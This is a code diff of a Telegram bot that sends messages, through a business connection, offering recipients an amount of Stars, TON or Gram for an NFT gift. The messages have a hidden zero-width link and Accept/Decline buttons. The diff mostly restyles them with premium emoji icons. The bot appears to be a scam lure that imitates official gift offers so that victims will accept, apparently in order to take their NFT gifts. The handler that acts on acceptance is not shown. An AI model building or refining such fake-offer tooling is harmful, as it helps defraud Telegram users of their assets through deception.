@@ -13,6 +13,13 @@ dispatcher = Dispatcher()
 last_offer_data = {}
 last_message_id = None
 
+# ID премиум-эмодзи
+STAR_EMOJI_ID = "5323333018151045958"
+CHECK_EMOJI_ID = "5774022692642492953"
+CROSS_EMOJI_ID = "5778527486270770928"
+
+STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
+
 # --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
@@ -47,28 +54,26 @@ async def send_offer(message: Message):
 
     parts = message.text.split()
     
-    # Теперь ожидаем 5 частей: .gpt, ссылка, сумма, валюта, язык
     if len(parts) != 5:
         return
 
     link = parts[1]
     amount = parts[2]
     currency_raw = parts[3].lower()
-    lang = parts[4].lower() # 'ru' или 'en'
+    lang = parts[4].lower()
 
     if currency_raw not in ["stars", "ton", "gram"]:
         return
 
     if lang not in ["ru", "en"]:
-        return # Если язык не указан или неверен — игнорируем
+        return
 
-    # Настройка валюты
     if currency_raw == "stars":
-        currency_display = "⭐ Stars" if lang == "ru" else "⭐ Stars"
+        currency_display = STAR_EMOJI
     elif currency_raw == "ton":
         currency_display = "TON"
     else:
-        currency_display = "Gram" if lang == "ru" else "Gram"
+        currency_display = "Gram"
 
     nft_slug = link.rstrip("/").split("/")[-1]
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
@@ -79,7 +84,6 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Текст в зависимости от языка
     if lang == "ru":
         offer_text = (
             f"<b>Пользователь {sender_name} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
@@ -93,9 +97,18 @@ async def send_offer(message: Message):
             f"{hidden_link}"
         )
 
+    # Кнопки с премиум-иконками (крестик и галочка)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="✕ Отклонить" if lang == "ru" else "✕ Decline", callback_data="decline"),
-        InlineKeyboardButton(text="✓ Принять" if lang == "ru" else "✓ Accept", callback_data="accept_offer")
+        InlineKeyboardButton(
+            text="Отклонить" if lang == "ru" else "Decline", 
+            callback_data="decline",
+            icon_custom_emoji_id=CROSS_EMOJI_ID # <--- Крестик
+        ),
+        InlineKeyboardButton(
+            text="Принять" if lang == "ru" else "Accept", 
+            callback_data="accept_offer",
+            icon_custom_emoji_id=CHECK_EMOJI_ID # <--- Галочка
+        )
     ]])
 
     last_offer_data = {
@@ -104,7 +117,7 @@ async def send_offer(message: Message):
         "currency_display": currency_display,
         "link": link,
         "sender_username": message.from_user.username,
-        "lang": lang, # Сохраняем язык для следующих шагов
+        "lang": lang,
         "business_connection_id": message.business_connection_id
     }
 
